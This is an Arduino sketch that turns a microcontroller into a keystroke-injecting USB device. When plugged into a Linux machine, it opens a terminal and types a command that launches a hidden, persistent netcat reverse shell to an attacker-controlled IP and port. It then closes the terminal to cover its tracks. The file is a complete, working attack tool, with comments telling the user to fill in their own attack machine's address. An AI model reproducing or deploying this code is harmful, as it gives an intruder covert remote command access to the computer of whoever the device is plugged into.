#include <Keyboard.h>


void setup() {
    Keyboard.begin(); // starting emulating the keyboard 
}

void loop() {
    delay(500); //  is there to make sure that the device that the keystroke is being sent to has time to receive the data and interpret it
    Keyboard.press(KEY_LEFT_CTRL); // using the short cut CTRl + ALT + t 
    Keyboard.press(KEY_LEFT_ALT); // to open a terminal 
    Keyboard.press('t');
    delay(500);
    Keyboard.releaseAll(); // release the other keys 
    delay(1500);
    // edit the IP and THE PORT parameters to your machine (Attack machine)
    Keyboard.println("screen -md \"bash -c 'exec -a shell nc -e /bin/bash 10.10.10.16 4444'\""); // using screen to open screen session this process will keep running  
    Keyboard.write(KEY_RETURN);                                                                  // even if the user closes the terminal 
    Keyboard.println("exit"); // exit from the terminal 
    Keyboard.write(KEY_RETURN); // press enter 
}


  
